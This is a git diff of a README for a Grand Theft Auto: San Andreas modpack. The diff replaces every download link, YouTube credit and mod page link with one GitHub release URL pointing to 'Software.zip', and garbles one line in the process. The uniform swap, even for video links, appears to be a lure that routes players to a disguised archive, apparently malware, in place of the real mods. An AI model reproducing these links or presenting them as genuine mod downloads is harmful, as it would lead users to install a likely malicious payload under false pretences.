@@ -1,7 +1,7 @@
 # Introduction to a Grand Theft Auto: San Andreas MODPACK, but not only a modpack, a revolution.
 <h3 align="center">
 
-(New [gist](https://gist.github.com/AkashnilRecovered/77a409f594fa5851547d92d4a2b890ad) has been published. Comment there for your reports.)
+(New [gist](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) has been published. Comment there for your reports.)
 
 Welcome to the next evolution of Grand Theft Auto: San Andreas....
  
@@ -11,23 +11,23 @@ Please beware of loading this game into a new game, it might not work and crash.
 
 This modpack has some superpower mods, if you're okay with that.
 
-I recommend this completed [savegame](https://www.gtainside.com/en/sanandreas/savegames/53374-king-of-san-andreas-100-savegame/) for good working of the game.
+I recommend this completed [savegame](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) for good working of the game.
 
 Thanks to these youtubers for listing their recommended mods:
 
-[Baigagee](https://www.youtube.com/@baigagee) for their video [I Installed 130+ GTA San Andreas Mods](https://www.youtube.com/watch?v=Ajzk0Z_M6ag)
+[Baigagee](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) for their video [I Installed 130+ GTA San Andreas Mods](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-[Catsmackaroo](https://www.youtube.com/@catsmackaroo) for their video [A Look At The Best GTA San Andreas Mods](https://www.youtube.com/watch?v=BGkmM0E0Ysk&t=142s)
+[Catsmackaroo](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) for their video [A Look At The Best GTA San Andreas Mods](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-[Internet Rob](https://www.youtube.com/@InternetRob) for their video [I Installed 57 GTA San Andreas Mods](https://www.youtube.com/watch?v=B5relHf21lo&t=204s&pp=ygUMaW50ZXJuZXQgcm9i)
+[Internet Rob](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) for their video [I Installed 57 GTA San Andreas Mods](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-[Just Gesha](https://www.youtube.com/@justGesha) for their video [A Faithful GTA San Andreas Overhaul Using Mods](https://www.youtube.com/watch?v=XMwzzZAkZCM&t=244s&pp=ygUKanVzdCBnZXNoYQ%3D%3D)
+[Just Gesha](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) for their video [A Faithful GTA San Andreas Overhaul Using Mods](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip%3D%3D)
 </h3><br>
 <p align="center">
 
 
 # Download
-<p align="center">https://mega.nz/file/PzxnQD6S#tnQp88amARjSDg7lIrjROolOrkmUSt7KFqqSetsnKPA (outdated 1.0.0 (see changelog))
+<p align="center">https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip (outdated 1.0.0 (see changelog))
 <br><br>
 Check out the mods down there.
 <br><br>
@@ -76,327 +76,327 @@ Have fun enjoying with the vast modifications👍</p>
 
 ## From CLEO folder
 
-- [Buy Property](https://www.mixmods.com.br/2022/06/buy-property-mod-comprar-propriedades/)
+- [Buy Property](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Cheat Menu (press Ctrl+C)](https://www.gtainside.com/en/sanandreas/mods/125320-san-andreas-cheat-menu/)
+- [Cheat Menu (press Ctrl+C)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [CLEO+](https://www.mixmods.com.br/2023/10/cleoplus/)
+- [CLEO+](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Tuning Mod](https://www.mixmods.com.br/2019/06/tuning-mod/)
+- [Tuning Mod](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Mind Control & Possession (what?) (type 9XCTR or 1+C)](https://www.gtainside.com/en/sanandreas/mods/135757-mind-control-and-possession-v-14-pc-perfect-version/)
+- [Mind Control & Possession (what?) (type 9XCTR or 1+C)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Enhance ParticleTXD](https://www.mixmods.com.br/2016/03/enhance-particletxd/)
+- [Enhance ParticleTXD](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Gravity Gun (type GGUN)](https://www.gtainside.com/en/sanandreas/mods/54651-gravity-gun-v1/)
+- [Gravity Gun (type GGUN)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Drug Dealer Fix](https://www.gtagarage.com/mods/show.php?id=29199)
+- [Drug Dealer Fix](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [L-D Luz.cs (which mod?)](https://www.mediafire.com/file/c0a4aggmlwg1qr4/L-D_Luz_%2528JuniorDjjr%2529.cs/file)
+- [L-D https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip (which mod?)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip%2528JuniorDjjr%https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Life Situations](https://www.gtainside.com/en/sanandreas/mods/108394-life-situation-9-0)
+- [Life Situations](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Master Spark (press TAB+H)](https://www.gtainside.com/en/sanandreas/mods/37714-master-spark/)
+- [Master Spark (press TAB+H)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Nearest Ped Control (press 6)](https://www.gtagarage.com/mods/show.php?id=8242)
+- [Nearest Ped Control (press 6)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [New Car Wash](https://www.mixmods.com.br/2020/08/car-wash-v2-2-lava-rapido-funcional/)
+- [New Car Wash](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [NewOpcodes](https://www.mixmods.com.br/2020/10/newopcodes-cleo-v2-1/)
+- [NewOpcodes](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Hangout with Story Characters](https://www.mixmods.com.br/2020/06/hangout-with-story-characters-recrutar-personagens/)
+- [Hangout with Story Characters](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [RZL-Trainer (press F2)](https://www.mixmods.com.br/2021/08/rzl-trainer-cheat-menu/)
+- [RZL-Trainer (press F2)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- Note: [RZL-Trainer](https://www.mixmods.com.br/2021/08/rzl-trainer-cheat-menu/) is configured to the cheat settings. You may to reset defaults using the Reset Defaults option in Settings.
+- Note: [RZL-Trainer](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) is configured to the cheat settings. You may to reset defaults using the Reset Defaults option in Settings.
 
-- [Stories Sprinting](https://gtaforums.com/topic/968368-stories-sprinting/)
+- [Stories Sprinting](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Surfly (press ALT+X)](https://www.gtaall.com/gta-san-andreas/cleo/44884-surf-and-fly.html)
+- [Surfly (press ALT+X)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Trucks & Trailers](https://www.mixmods.com.br/2016/07/trucks-trailers-reboques-avioes-etc/)
+- [Trucks & Trailers](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Wrecking Ball (press B)](https://libertycity.net/files/gta-san-andreas/8000-wrecking-ball.html)
+- [Wrecking Ball (press B)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Project Urbanize (public access)](https://www.mixmods.com.br/2024/10/urbanize/)
+- [Project Urbanize (public access)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
 ## From GTA San Andreas directory
 
-- [Fastman92 Limit Adjuster](https://fastman92.com/19-fastman92-limit-adjuster)
+- [Fastman92 Limit Adjuster](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [NoDEP](https://www.mixmods.com.br/2015/03/nodep-desativar-dep/)
+- [NoDEP](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Essentials Pack](https://www.mixmods.com.br/2019/06/sa-essentials-pack/)
+- [Essentials Pack](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Cheat Menu by Grinch (press Ctrl+M)](https://github.com/user-grinch/Cheat-Menu)
+- [Cheat Menu by Grinch (press Ctrl+M)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [CrashInfo](https://www.mixmods.com.br/2022/09/crashinfo/)
+- [CrashInfo](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [CLEO](https://cleo.li/)
+- [CLEO](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [First Person (press "V" 4 times) (beta 3.5)](https://www.mixmods.com.br/2022/03/first-person-mod-primeira-pessoa/)
+- [First Person (press "V" 4 times) (beta 3.5)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Full Stream Radar](https://www.mixmods.com.br/2015/01/full-stream-radar-fix-radar-sumindo/)
+- [Full Stream Radar](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Gojo Satoru (type GOJO to activate and 00 to deactivate)](https://www.gtainside.com/en/sanandreas/mods/193370-update-gojo-satoru-jujutsu-kaisen-mod-new-features-amp-bug-fixes/video/1/)
+- [Gojo Satoru (type GOJO to activate and 00 to deactivate)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [SA 1.0 (pretty much required for all these mods)](https://www.gtaall.com/gta-san-andreas/programs/135576-gta-sa-exe-1-0-us-original-version.html)
+- [SA 1.0 (pretty much required for all these mods)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Improved Vehicle Features (2.0.2) (reason at optional mods)](https://www.mixmods.com.br/2020/01/imvehft-improved-vehicle-features/)
+- [Improved Vehicle Features (2.0.2) (reason at optional mods)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Large Address](https://www.mixmods.com.br/2016/09/iii-vc-sa-largeaddress-reconhecer-3-4-gb-de-ram/)
+- [Large Address](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Moonloader](https://www.mixmods.com.br/2020/10/moonloader/)
+- [Moonloader](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [MixSets](https://www.mixmods.com.br/2022/03/sa-mixsets/)
+- [MixSets](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Modloader](https://www.gtagarage.com/mods/show.php?id=25377)
+- [Modloader](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Real Traffic Fix](https://www.mixmods.com.br/2022/04/real-traffic-fix/)
+- [Real Traffic Fix](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [SilentPatch](https://gtaforums.com/topic/669045-silentpatch/)
+- [SilentPatch](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [24 Hour Timecycle](https://www.mixmods.com.br/2017/08/24h-timecycle-timecyc-dat-de-24-horas/)
+- [24 Hour Timecycle](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [GTA V HUD (DK22PAC VERSION)](https://gtaforums.com/topic/652697-gta5-hud-by-dk22pac/)
+- [GTA V HUD (DK22PAC VERSION)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Weapon RecoilRE](https://gtaforums.com/topic/975920-asi-weaponrecoilre/)
+- [Weapon RecoilRE](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
 ## In moonloader folder
 
-- [Gang Rider (press Y while in a vehicle to call your gang)](https://www.mixmods.com.br/2020/08/gang-rider-v2-carregar-mais-gangue/)
+- [Gang Rider (press Y while in a vehicle to call your gang)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
 thats it lol
 
 ## In data folder
 
-- [Real Linear Graphics](https://www.mixmods.com.br/2022/07/real-linear-graphics/)
+- [Real Linear Graphics](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
 thats it lol
 
 ## In modloader folder (BIG!)
 
-- [4K Definitive Loadscreens](https://www.mixmods.com.br/2021/12/loadscreens-4k-definitive-artworks-widescreen-hd/)
+- [4K Definitive Loadscreens](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Essentials Pack](https://www.mixmods.com.br/2019/06/sa-essentials-pack/)
+- [Essentials Pack](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [3D Models in Ammu Nation](https://www.mixmods.com.br/2016/07/modelos-em-3d-na-ammu-nation/)
+- [3D Models in Ammu Nation](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Air Traffic](https://libertycity.net/files/gta-san-andreas/25527-air-traffic-pro-v.6-final.html)
+- [Air Traffic](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Atmosphere Interface Pack](https://www.mixmods.com.br/2021/01/atmosphere-interface-pack-interface-hd/)
+- [Atmosphere Interface Pack](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Attach Vehicle](https://www.mixmods.com.br/2020/04/attach-vehicle-grudar-carros-no-packer-etc/)
+- [Attach Vehicle](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Beta Gang Skins Added](https://www.mixmods.com.br/2020/11/beta-gang-skins-added-restaurar-gangue-beta/)
+- [Beta Gang Skins Added](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Blaze (type blaze then go into a car or bike and press left click to activate the power)](https://www.mediafire.com/file/h2b1e5ldwn1odxn/Blaze.cs/file)
+- [Blaze (type blaze then go into a car or bike and press left click to activate the power)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Brazilian Speedbumps](https://libertycity.net/files/gta-san-andreas/139041-brazilskie-lezhachie-policejjskie.html)
+- [Brazilian Speedbumps](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Breakable Vending Machines](https://www.mixmods.com.br/2022/08/sa-breakeable-vending-machines/)
+- [Breakable Vending Machines](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Bullet Holes](https://www.mixmods.com.br/2015/06/bullethole-buracos-de-tiros/)
+- [Bullet Holes](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
  
-- [Bullet View (hold shift while aiming on sniper and then shoot to see your own bullet)](https://www.mixmods.com.br/2021/02/bullet-view-ver-bala-da-sniper-em-slow-motion/)
+- [Bullet View (hold shift while aiming on sniper and then shoot to see your own bullet)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Busy Pedestrians](https://www.gtainside.com/en/sanandreas/mods/192256-busy-pedestrians/)
+- [Busy Pedestrians](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Car Crash Look](https://www.mixmods.com.br/2019/04/car-crash-look-pedestres-olharem-ao-bater-o-carro/)
+- [Car Crash Look](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Car Dealership (available near the raiding house in recruiting the families mission)](https://www.mixmods.com.br/2020/06/car-dealership-concessionaria-de-carros/)
+- [Car Dealership (available near the raiding house in recruiting the families mission)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Cars Divert](https://www.mixmods.com.br/2015/03/cars-divert-v1-1-carros-desviarem-de-voce/)
+- [Cars Divert](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Clever Trams](https://www.mixmods.com.br/2020/01/clever-trams-bondes-mais-inteligentes/)
+- [Clever Trams](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Combat Improvement & Melee Overhaul](https://www.mixmods.com.br/2021/08/combat-improvement-and-melee-overhaul-melhorar-lutas/)
+- [Combat Improvement & Melee Overhaul](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Cop Improved Intelligence](https://www.gtainside.com/en/sanandreas/mods/76432-police-intelligence-improvement-v2-0/)
+- [Cop Improved Intelligence](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Desert Drag Race Track (near Verdant Meadows)](https://www.gtainside.com/en/sanandreas/maps/26243-cleo-dragtrack-final/)
+- [Desert Drag Race Track (near Verdant Meadows)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Enhanced Classic Graphics](https://www.mixmods.com.br/2019/10/ecg-enhanced-classic-graphics/)
+- [Enhanced Classic Graphics](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Effects Mod](https://www.mixmods.com.br/2021/09/effects-mod-by-ezekiel-junior_djjr-efeitos-realistas/)
+- [Effects Mod](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Effects Loader](https://www.mixmods.com.br/2017/04/effects-loader-instalar-efeitos-sem-substituir-arquivos/)
+- [Effects Loader](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Enterable Hidden Interiors](https://www.mixmods.com.br/2021/01/enterable-hidden-interiors-entrar-em-interiores-escondidos/)
+- [Enterable Hidden Interiors](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Enterable Vehicles](https://libertycity.net/files/gta-san-andreas/54621-enterable-vehicles-v2.0.html)
+- [Enterable Vehicles](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Fair Police](https://www.mixmods.com.br/2020/10/fair-police-v2-0-2-policiais-atacam-pedestres/)
+- [Fair Police](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Flying Stuff](https://www.mixmods.com.br/2020/02/flying-stuff-folhas-etc-caindo-pela-tela/)
+- [Flying Stuff](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Formal 2K Grass Textures](https://www.mixmods.com.br/2018/12/formal-2k-grass-textures-grama-hd/)
+- [Formal 2K Grass Textures](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [FxsFuncs](https://www.mixmods.com.br/2022/10/fxsfuncs/)
+- [FxsFuncs](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Gojo Satoru (type GOJO to activate and 00 to deactivate)](https://www.gtainside.com/en/sanandreas/mods/193370-update-gojo-satoru-jujutsu-kaisen-mod-new-features-amp-bug-fixes/video/1/)
+- [Gojo Satoru (type GOJO to activate and 00 to deactivate)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Graffiti Anywhere (use your spray can and scroll through 4 graffitis and pick your chosen one, then just hold LMB and it's done)](https://www.mixmods.com.br/2020/11/graffiti-anywhere-v1-1-pichar-em-qualquer-lugar/)
+- [Graffiti Anywhere (use your spray can and scroll through 4 graffitis and pick your chosen one, then just hold LMB and it's done)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [GraphicsTweaker](https://www.mixmods.com.br/2022/09/graphicstweaker/)
+- [GraphicsTweaker](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Gravity Fix](https://www.mixmods.com.br/2018/11/gravity-fix-correcao-de-gravidade/)
+- [Gravity Fix](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [GTA IV Carjacking Style](https://www.gtainside.com/en/sanandreas/mods/144079-gta-sa-iv-carjacking-camera-style/)
+- [GTA IV Carjacking Style](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Gungnir (type gung and press LMB)](https://www.mediafire.com/file/8dicncbkudq90dr/Gungnir.rar/file)
+- [Gungnir (type gung and press LMB)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Haisen (type haisen and press LMB)](https://www.mediafire.com/file/9swail6hk9ghhap/Haisen.rar/file)
+- [Haisen (type haisen and press LMB)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Handshake Mod (aim at the person and press Y))](https://www.mixmods.com.br/2020/08/handshake-mod-aperto-de-mao/)
+- [Handshake Mod (aim at the person and press Y))](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Hard Rain Remake](https://www.mixmods.com.br/2019/07/hard-rain-remake-pedestres-com-guarda-chuva/)
+- [Hard Rain Remake](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Hisouten (type hisouten and press LMB)](https://www.mediafire.com/file/lmi0imomz19yoia/Hisouten.cs/file)
+- [Hisouten (type hisouten and press LMB)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Hoyoku (type hoyoku and press LMB)](https://www.mediafire.com/file/zyatxuczmp1u0u9/Hoyoku.rar/file)
+- [Hoyoku (type hoyoku and press LMB)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Illuminated Vinewood Sign](https://www.mixmods.com.br/2021/10/illuminated-vinewood-sign-placa-de-vinewood-iluminada/)
+- [Illuminated Vinewood Sign](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [IMFX (replaced some files with Combat FX Upgrade and Smooth Lensflare](https://www.mixmods.com.br/2018/09/imfx-improved-fx/)
+- [IMFX (replaced some files with Combat FX Upgrade and Smooth Lensflare](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- Improved 2DFX (included with the [Enhanced Classic Graphics](https://www.mixmods.com.br/2019/10/ecg-enhanced-classic-graphics/)) has not been found. Just install it with the [Enhanced Classic Graphics](https://www.mixmods.com.br/2019/10/ecg-enhanced-classic-graphics/).
+- Improved 2DFX (included with the [Enhanced Classic Graphics](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)) has not been found. Just install it with the [Enhanced Classic Graphics](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip).
 
-- [Improved Streaming](https://www.mixmods.com.br/2022/04/improved-streaming/)
+- [Improved Streaming](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Improved and Fixed Original Vegetation](https://www.mixmods.com.br/2021/04/improved-and-fixed-original-vegetation-arvores-mais-redondas/)
+- [Improved and Fixed Original Vegetation](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [IndieVehicles (included in Tuning Mod)](https://www.mixmods.com.br/2019/08/indievehicles/)
+- [IndieVehicles (included in Tuning Mod)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Inventory System (with installed cheat and shops)](https://www.mixmods.com.br/2022/05/inventory-system/)
+- [Inventory System (with installed cheat and shops)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Killing Jack (type kjack and press LMB)](https://www.mediafire.com/file/a37qnky49vv27g0/KJACK.rar/file)
+- [Killing Jack (type kjack and press LMB)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Ladders Mod](https://www.mixmods.com.br/2022/11/ladders-mod-subir-escadas/)
+- [Ladders Mod](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Laevateinn (normal flame recommended) (type laevateinn and a flaming katana spawns in your hand)](https://www.mediafire.com/file/3jbf9jbhrjilra3/Laevateinn.rar/file)
+- [Laevateinn (normal flame recommended) (type laevateinn and a flaming katana spawns in your hand)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Lamppost Insects](https://www.mixmods.com.br/2015/09/lamppost-insects-insetos-nas-luzes-dos-postes/)
+- [Lamppost Insects](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Lighthouse Pyramid Fix](https://www.mixmods.com.br/2020/01/lighthouse-pyramid-fix-farol-e-piramide-com-luz/)
+- [Lighthouse Pyramid Fix](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [LS Lit Church](https://www.mixmods.com.br/2022/03/ls-lit-church-igreja-com-luzes-acesas/)
+- [LS Lit Church](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Lively Trailers](https://libertycity.net/files/gta-san-andreas/179872-ozhivlennye-trejjlery.html)
+- [Lively Trailers](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Low Life Animation](https://www.mixmods.com.br/2019/07/low-life-animation-v1-2-2-animacao-de-saude-baixa/)
+- [Low Life Animation](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Lunatic Cage (type lcage and press LMB)](https://www.mediafire.com/file/2278ma4bfxfxmen/Lunatic_Cage.rar/file)
+- [Lunatic Cage (type lcage and press LMB)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Manual Driveby Remake (press RMB while in a car to shoot with your UZI or Tec-9 or SMG)](https://www.mixmods.com.br/2021/10/manual-driveby-remake-fixed-mirar-de-dentro-do-carro/)
+- [Manual Driveby Remake (press RMB while in a car to shoot with your UZI or Tec-9 or SMG)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Missing Lampposts Fix](https://www.mixmods.com.br/2022/04/missing-lampposts-fix-more-light-posts/)
+- [Missing Lampposts Fix](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Mobile Hands](https://www.gtainside.com/en/sanandreas/mods/168952-mobile-hands/)
+- [Mobile Hands](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [More Radar Icons](https://www.mixmods.com.br/2022/01/more-radar-icons/)
+- [More Radar Icons](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [No Grenade Stop](https://www.gtagarage.com/mods/show.php?id=9619)
+- [No Grenade Stop](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Nondle (type nondle and press LMB)](https://www.mediafire.com/file/kfnc1oyggx1hjg0/Non_D_Laser.cs/file)
+- [Nondle (type nondle and press LMB)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [NPC Tuning](https://www.mixmods.com.br/2020/11/npc-tuning-trafego-com-carros-tunados/)
+- [NPC Tuning](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Oeyama (type oeyama and hold LMB)](https://www.mediafire.com/file/6z4tgac6zjlzgz0/Oeyama.cs/file)
+- [Oeyama (type oeyama and hold LMB)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Open Limit Adjuster](https://www.mixmods.com.br/2022/10/open-limit-adjuster/)
+- [Open Limit Adjuster](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Original HQ Palms](https://www.mixmods.com.br/2021/03/savc-original-hq-palms-palmeiras-remasterizadas/)
+- [Original HQ Palms](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Original Peds Vary Extended](https://www.mixmods.com.br/2021/03/original-peds-vary-peds-originais-variando-pedfuncs/)
+- [Original Peds Vary Extended](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Ped Tweaks](https://www.mixmods.com.br/2021/09/sa-ped-tweaks-restaurar-policiais-e-pedestres/)
+- [Ped Tweaks](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [PedFuncs](https://www.mixmods.com.br/2022/07/pedfuncs/)
